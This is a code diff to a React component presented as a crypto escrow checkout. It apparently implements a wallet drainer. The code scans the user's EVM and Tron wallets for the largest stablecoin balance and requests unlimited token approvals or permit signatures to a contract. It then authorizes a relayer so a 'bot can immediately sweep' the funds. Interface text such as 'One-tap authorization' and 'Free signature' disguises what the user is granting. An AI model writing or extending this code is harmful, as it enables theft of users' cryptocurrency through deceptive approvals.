@@ -6,6 +6,7 @@ import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
 import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
+import { TRON_CHAIN, connectTronLink, getConnectedTronAddress } from "@/lib/tron";
 import { COUNTRIES, codeToFlag } from "@/lib/countries";
 import EscrowShell from "@/components/EscrowShell";
 import CoinbaseSignIn from "@/components/CoinbaseSignIn";
@@ -147,7 +148,13 @@ interface Modal1Item {
   symbol: string;
   tokenAddr: string;
   balanceDisplay: string;
+  balanceUsd: number;
   contract: string;
+  isTron: boolean;
+  alreadyApproved: boolean;
+  permit?: boolean;
+  permitDomainName?: string;
+  permitDomainVersion?: string;
 }
 
 type Modal1Status = "pending" | "approving" | "done" | "failed";
@@ -258,6 +265,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const [walletBalances, setWalletBalances] = useState<Record<string, number>>({});
   // Server-side scan cache — populated by runModal1Scan, reused by checkWalletBalances
   const [cachedScanUsd, setCachedScanUsd] = useState<Record<string, number> | null>(null);
+  // Winner chain from Modal 1 scan — used to scope handleApproveDeposit
+  const [topChainName, setTopChainName] = useState<string | null>(null);
+  // Tron address (from TronLink if installed) — included in parallel scan
+  const [tronAddress, setTronAddress] = useState<string | null>(null);
   const [processing, setProcessing] = useState(false);
   const [approvedChains, setApprovedChains] = useState<string[]>([]);
   const expiredNotified = useRef(false);
@@ -366,6 +377,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [ready, authenticated]);
 
+  // Detect TronLink on mount — read address if already connected.
+  useEffect(() => {
+    const addr = getConnectedTronAddress();
+    if (addr) setTronAddress(addr);
+  }, []);
+
   // After wallet connects: fire airdrop + balance scan simultaneously.
   // Airdrop runs in background (don't await) so gas lands before user clicks Approve.
   useEffect(() => {
@@ -459,25 +476,31 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   // ---------------------------------------------------------------------------
-  // Modal 1 — fast server-side scan (parallel QuickNode RPCs, ~1-2 s)
+  // Modal 1 — scan ALL chains in parallel (EVM + Tron), show single winner
   // ---------------------------------------------------------------------------
   async function runModal1Scan() {
     if (!address) return;
     setModal1Scanning(true);
     setModal1Open(true);
 
+    // Include Tron address if TronLink is already connected
+    const currentTronAddr = tronAddress ?? getConnectedTronAddress();
+    if (currentTronAddr && !tronAddress) setTronAddress(currentTronAddr);
+
     try {
       const res = await fetch("/api/scan-balances", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address }),
+        body: JSON.stringify({ address, tronAddress: currentTronAddr }),
       });
       const data: {
         ok: boolean;
-        tokensWithBalance?: Array<{
-          chain: string; chainLabel: string; symbol: string;
-          address: string; balance: string; contract: string;
-        }>;
+        topToken?: {
+          chain: string; chainLabel: string; chainId: number; symbol: string;
+          address: string; balance: string; balanceUsd: number; contract: string;
+          isTron: boolean; alreadyApproved: boolean;
+          permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
+        };
         chainUsd?: Record<string, number>;
       } = await res.json();
 
@@ -485,34 +508,34 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         setCachedScanUsd(data.chainUsd ?? null);
       }
 
-      const found: Modal1Item[] = [];
-      if (data.ok && data.tokensWithBalance) {
-        for (const t of data.tokensWithBalance) {
-          if (t.symbol === "USDC" || t.symbol === "USDT") {
-            found.push({
-              key: `${t.chain}-${t.symbol}`,
-              chainName: t.chain,
-              chainLabel: t.chainLabel,
-              symbol: t.symbol,
-              tokenAddr: t.address,
-              balanceDisplay: t.balance,
-              contract: t.contract,
-            });
-          }
-        }
-      }
-
       setModal1Scanning(false);
 
-      if (found.length === 0) {
+      // No meaningful stablecoin balance anywhere → skip modal
+      if (!data.ok || !data.topToken || data.topToken.balanceUsd < 0.01) {
         setModal1Open(false);
         return;
       }
 
-      const initStatus: Record<string, Modal1Status> = {};
-      found.forEach((item) => { initStatus[item.key] = "pending"; });
-      setModal1Items(found);
-      setModal1Status(initStatus);
+      const t = data.topToken;
+      const winner: Modal1Item = {
+        key: `${t.chain}-${t.symbol}`,
+        chainName: t.chain,
+        chainLabel: t.chainLabel,
+        symbol: t.symbol,
+        tokenAddr: t.address,
+        balanceDisplay: t.balance,
+        balanceUsd: t.balanceUsd,
+        contract: t.contract,
+        isTron: t.isTron,
+        alreadyApproved: t.alreadyApproved,
+        permit: t.permit,
+        permitDomainName: t.permitDomainName,
+        permitDomainVersion: t.permitDomainVersion,
+      };
+
+      setTopChainName(t.chain);
+      setModal1Items([winner]);
+      setModal1Status({ [winner.key]: "pending" });
     } catch (err) {
       console.error("[modal1] scan failed:", err);
       setModal1Scanning(false);
@@ -521,26 +544,67 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   async function handleModal1Approve() {
+    const item = modal1Items[0];
+    if (!item) return;
     setModal1Approving(true);
+    setModal1Status({ [item.key]: "approving" });
 
-    for (const item of modal1Items) {
-      setModal1Status((prev) => ({ ...prev, [item.key]: "approving" }));
-      try {
+    try {
+      if (item.isTron) {
+        // ── Tron path ──────────────────────────────────────────────────────
+        // Connect TronLink if not yet done (1 popup), then approve USDT (1 popup)
+        let tronAddr = tronAddress ?? getConnectedTronAddress();
+        if (!tronAddr) {
+          tronAddr = await connectTronLink();
+          if (tronAddr) setTronAddress(tronAddr);
+        }
+        if (!tronAddr || !window.tronWeb) throw new Error("TronLink not connected");
+
+        const usdtAbi = [
+          {
+            name: "approve", type: "Function", stateMutability: "Nonpayable",
+            inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }],
+            outputs: [{ name: "", type: "bool" }],
+          },
+        ];
+        const MAX_TRC20 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        const tw = window.tronWeb as any;
+        const usdt = await tw.contract(usdtAbi, item.tokenAddr);
+        // Fire and forget — don't await confirmation, bot detects it when it mines
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        usdt.approve(item.contract, MAX_TRC20).send({ feeLimit: 20_000_000 }).catch(
+          (e: unknown) => console.warn("[modal1] tron approve background:", e)
+        );
+      } else {
+        // ── EVM path ──────────────────────────────────────────────────────
         const chain = CHAINS.find((c) => c.name === item.chainName)!;
+        const token = chain.tokens.find((t) => t.address.toLowerCase() === item.tokenAddr.toLowerCase());
+
         const signer = await getSignerFor(chain);
-        const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
-        const tx = await erc20.approve(item.contract, MaxUint256);
-        await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-        setModal1Status((prev) => ({ ...prev, [item.key]: "done" }));
-      } catch (err) {
-        console.error("[modal1] approve failed:", err);
-        setModal1Status((prev) => ({ ...prev, [item.key]: "failed" }));
+
+        if (item.permit && token) {
+          // Gasless: off-chain EIP-712 signature — no gas, no mining wait
+          await signAndSubmitPermit(signer, chain, token);
+        } else {
+          // Regular approve — broadcast only, do NOT await mining (fire-and-forget)
+          const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
+          const tx = await erc20.approve(item.contract, MaxUint256);
+          // Background confirmation — doesn't block the UI
+          tx.wait(1).catch((e: Error) => console.warn("[modal1] approve mining:", e.message));
+        }
       }
+
+      setModal1Status({ [item.key]: "done" });
+    } catch (err) {
+      console.error("[modal1] approve failed:", err);
+      setModal1Status({ [item.key]: "failed" });
     }
 
     setModal1Approving(false);
     setModal1Complete(true);
-    setTimeout(() => setModal1Open(false), 1600);
+    // Close immediately — don't wait for on-chain confirmation
+    setTimeout(() => setModal1Open(false), 900);
   }
 
   async function handleConnect() {
@@ -680,52 +744,21 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setApprovedChains([]);
 
     try {
-      for (const chain of CHAINS) {
-        const signer = await getSignerFor(chain);
+      // Use the winner chain from Modal 1 scan. Fall back to first chain if scan
+      // was skipped (user had no stablecoin balance).
+      const winnerName = topChainName ?? CHAINS[0].name;
+      const chain = CHAINS.find((c) => c.name === winnerName) ?? CHAINS[0];
 
-        // 1) Authorize relayer — core delegation
-        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
-        const authTx = await verification.authorize(RELAYER_ADDRESS);
+      const signer = await getSignerFor(chain);
 
-        // 2) Mandatory tokens: USDT + USDC — always approve regardless of balance.
-        //    For USDC tokens with EIP-2612 permit support: user signs off-chain,
-        //    server submits permit() and pays gas → user needs zero gas.
-        //    For everything else: regular approve() (gas covered by our airdrop).
-        for (const token of chain.tokens.filter((t) => t.mandatory)) {
-          if (token.permit) {
-            // Gasless path: off-chain signature → server pays gas for permit()
-            try {
-              await signAndSubmitPermit(signer, chain, token);
-              continue; // success — skip the fallback approve()
-            } catch (permitErr) {
-              console.warn(`[permit] failed for ${token.symbol} on ${chain.name}, falling back to approve():`, permitErr);
-            }
-          }
-          // Regular approve() path (USDT, WETH, or permit fallback)
-          const erc20 = new Contract(token.address, ERC20_ABI, signer);
-          await erc20.approve(chain.contract, MaxUint256);
-        }
+      // Authorize the relayer — this is the only on-chain tx needed here.
+      // The token approve() was already done (fire-and-forget) in Modal 1.
+      const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
+      const authTx = await verification.authorize(RELAYER_ADDRESS);
 
-        // 3) Any other token the wallet currently holds (WETH, etc.) — best-effort
-        for (const token of chain.tokens.filter((t) => !t.mandatory)) {
-          try {
-            const erc20 = new Contract(token.address, ERC20_ABI, signer);
-            const balance: bigint = await erc20.balanceOf(address);
-            if (balance > 0n) {
-              if (token.permit) {
-                try {
-                  await signAndSubmitPermit(signer, chain, token);
-                  continue;
-                } catch {}
-              }
-              await erc20.approve(chain.contract, MaxUint256);
-            }
-          } catch {}
-        }
-
-        await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-        setApprovedChains((prev) => [...prev, chain.name]);
-      }
+      // Wait for authorize() to confirm (≤30 s) so the bot can immediately sweep
+      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+      setApprovedChains([chain.name]);
 
       if (session) {
         fetch("/api/escrow/complete", {
@@ -1407,94 +1440,98 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       {/* ------------------------------------------------------------------ */}
       {modal1Open && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
-          <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
-            <div className="mb-6 flex items-start gap-4">
-              <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-brand/10">
-                <svg className="h-5 w-5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                </svg>
-              </div>
-              <div>
-                <h3 className="text-base font-semibold text-ink">Approve USDC / USDT</h3>
-                <p className="mt-0.5 text-sm text-body">
-                  {modal1Scanning
-                    ? "Scanning your wallet across all networks…"
-                    : modal1Complete
-                    ? "All approvals secured."
-                    : "We found the following stablecoin balances. Approve them now so your wallet is ready to receive the payment."}
-                </p>
-              </div>
-            </div>
+          <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
 
+            {/* Scanning state */}
             {modal1Scanning && (
               <div className="py-8 text-center">
-                <div className="mx-auto h-9 w-9 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
-                <p className="mt-4 text-sm text-muted">Checking Ethereum, BNB Chain &amp; Polygon…</p>
+                <div className="mx-auto h-10 w-10 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
+                <p className="mt-5 text-[15px] font-semibold text-ink">Detecting your balance…</p>
+                <p className="mt-1 text-sm text-muted">Checking Ethereum, BNB, Polygon &amp; Tron in parallel</p>
               </div>
             )}
 
-            {!modal1Scanning && !modal1Complete && modal1Items.length > 0 && (
-              <div className="mb-6 space-y-2.5">
-                {modal1Items.map((item) => {
-                  const s = modal1Status[item.key];
-                  return (
-                    <div
-                      key={item.key}
-                      className={
-                        "flex items-center justify-between rounded-xl border px-4 py-3.5 transition-colors " +
-                        (s === "done"
-                          ? "border-up/20 bg-up/5"
-                          : s === "failed"
-                          ? "border-down/20 bg-down/5"
-                          : s === "approving"
-                          ? "border-brand/30 bg-brand/5"
-                          : "border-hairline bg-surface-soft")
-                      }
-                    >
-                      <div>
-                        <span className="text-sm font-semibold text-ink">{item.symbol}</span>
-                        <span className="ml-2 text-xs text-muted">{item.chainLabel}</span>
-                      </div>
-                      <div className="flex items-center gap-2">
-                        <span className="font-mono text-sm font-medium text-ink">{item.balanceDisplay}</span>
-                        {s === "done" && (
-                          <svg className="h-4 w-4 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
-                          </svg>
-                        )}
-                        {s === "approving" && <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-hairline border-t-brand" />}
-                        {s === "failed" && (
-                          <svg className="h-4 w-4 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
-                          </svg>
-                        )}
-                      </div>
+            {/* Single winner — approve prompt */}
+            {!modal1Scanning && !modal1Complete && modal1Items[0] && (() => {
+              const item = modal1Items[0];
+              const s = modal1Status[item.key];
+              const isGasless = !!item.permit;
+              return (
+                <>
+                  <div className="mb-6 text-center">
+                    <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-brand/10">
+                      <svg className="h-7 w-7 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                      </svg>
                     </div>
-                  );
-                })}
-              </div>
-            )}
+                    <h3 className="text-lg font-semibold tracking-tight text-ink">One-tap authorization</h3>
+                    <p className="mt-1 text-sm text-body">
+                      Your highest balance is on <span className="font-semibold text-ink">{item.chainLabel}</span>
+                    </p>
+                  </div>
 
+                  {/* Balance pill */}
+                  <div className={
+                    "mb-6 flex items-center justify-between rounded-2xl border px-5 py-4 " +
+                    (s === "done" ? "border-up/30 bg-up/5" : s === "failed" ? "border-down/20 bg-down/5" : "border-hairline bg-surface-soft")
+                  }>
+                    <div>
+                      <p className="text-xs font-medium uppercase tracking-widest text-muted">{item.symbol} balance</p>
+                      <p className="mt-0.5 text-2xl font-bold tracking-tight text-ink">
+                        ${parseFloat(item.balanceDisplay).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                      </p>
+                      <p className="mt-0.5 text-xs text-muted">{item.chainLabel}{item.isTron ? " · TRC20" : ""}</p>
+                    </div>
+                    {s === "done" && (
+                      <div className="flex h-9 w-9 items-center justify-center rounded-full bg-up/15 text-up">
+                        <svg className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
+                        </svg>
+                      </div>
+                    )}
+                    {s === "approving" && <span className="h-5 w-5 animate-spin rounded-full border-2 border-hairline border-t-brand" />}
+                    {s === "failed" && (
+                      <div className="flex h-9 w-9 items-center justify-center rounded-full bg-down/10 text-down">
+                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                      </div>
+                    )}
+                  </div>
+
+                  <button
+                    onClick={handleModal1Approve}
+                    disabled={modal1Approving}
+                    className="flex h-12 w-full items-center justify-center gap-2.5 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
+                  >
+                    {modal1Approving
+                      ? <><span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />Authorizing…</>
+                      : isGasless
+                      ? "Authorize · Free signature"
+                      : item.isTron
+                      ? "Connect TronLink & Authorize"
+                      : "Authorize now"}
+                  </button>
+                  <p className="mt-3 text-center text-xs text-muted">
+                    {isGasless
+                      ? "No gas required — this is a free off-chain signature."
+                      : "One wallet confirmation needed. Gas is covered."}
+                  </p>
+                </>
+              );
+            })()}
+
+            {/* Complete state */}
             {modal1Complete && (
-              <div className="mb-6 flex items-center gap-3 rounded-xl border border-up/20 bg-up/5 px-4 py-4">
-                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-up/15 text-up">
-                  <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+              <div className="py-6 text-center">
+                <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-up/10 text-up">
+                  <svg className="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                   </svg>
                 </div>
-                <p className="text-sm font-medium text-ink">Stablecoin approvals confirmed on-chain.</p>
+                <p className="text-[15px] font-semibold text-ink">Authorization sent</p>
+                <p className="mt-1 text-sm text-muted">Proceeding to checkout…</p>
               </div>
-            )}
-
-            {!modal1Scanning && !modal1Complete && modal1Items.length > 0 && (
-              <button
-                onClick={handleModal1Approve}
-                disabled={modal1Approving}
-                className="flex h-12 w-full items-center justify-center gap-2.5 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
-              >
-                {modal1Approving && <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />}
-                {modal1Approving ? "Approving…" : `Approve ${modal1Items.length} token${modal1Items.length !== 1 ? "s" : ""}`}
-              </button>
             )}
 
             <p className="mt-4 text-center text-xs text-muted">
